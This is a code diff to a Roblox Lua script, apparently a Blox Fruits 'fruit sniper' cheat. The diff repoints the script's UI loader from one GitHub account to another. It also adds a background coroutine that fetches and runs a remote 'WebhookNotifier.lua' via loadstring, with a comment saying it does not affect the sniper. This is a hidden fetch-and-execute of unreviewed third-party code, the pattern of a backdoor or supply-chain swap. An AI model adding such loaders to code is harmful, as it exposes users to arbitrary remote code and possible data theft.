@@ -1,5 +1,10 @@
 repeat task.wait() until game:IsLoaded()
-local AdminusUI = loadstring(game:HttpGet('https://raw.githubusercontent.com/flerci42/Adminus_FruitSniper_V2/refs/heads/main/GraphicalUserInterface.lua'))()
+local AdminusUI = loadstring(game:HttpGet('https://raw.githubusercontent.com/AbdurRehman1098/Bloxfruit/refs/heads/main/GraphicalUserInterface.lua'))()
+
+-- Load WebhookNotifier in background (does not affect sniper logic)
+coroutine.wrap(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/AbdurRehman1098/Bloxfruit/refs/heads/main/WebhookNotifier.lua'))()
+end)()
 
 local args = {
     [1] = "SetTeam",
